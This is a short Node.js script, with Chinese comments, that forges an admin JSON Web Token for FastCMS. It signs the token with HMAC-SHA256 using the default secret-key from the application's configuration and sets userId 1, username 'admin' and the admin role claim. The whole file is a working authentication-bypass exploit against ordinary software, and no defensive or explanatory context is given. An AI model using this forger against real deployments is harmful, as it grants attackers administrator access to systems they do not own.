const crypto = require('crypto');

// application.yml: fastcms.auth.token.secret-key（AuthConfigs 中 BASE64 decode 后作为 HMAC 密钥）
const secretKeyB64 = 'SecretKey012345678901234567890123456789012345678901234567890123456789';
const key = Buffer.from(secretKeyB64, 'base64');

const b64url = (buf) => Buffer.from(buf).toString('base64url');
const header = b64url(JSON.stringify({ alg: 'HS256' }));
const now = Math.floor(Date.now() / 1000);
// auth claim 为角色 id 集合（ADMIN_ROLE_ID=1），isAdmin() 会 Long.valueOf(authority)
const payload = b64url(JSON.stringify({
  userId: 1,
  username: 'admin',
  auth: '1',
  exp: now + 18000
}));
const sig = crypto.createHmac('sha256', key).update(header + '.' + payload).digest('base64url');
console.log(header + '.' + payload + '.' + sig);
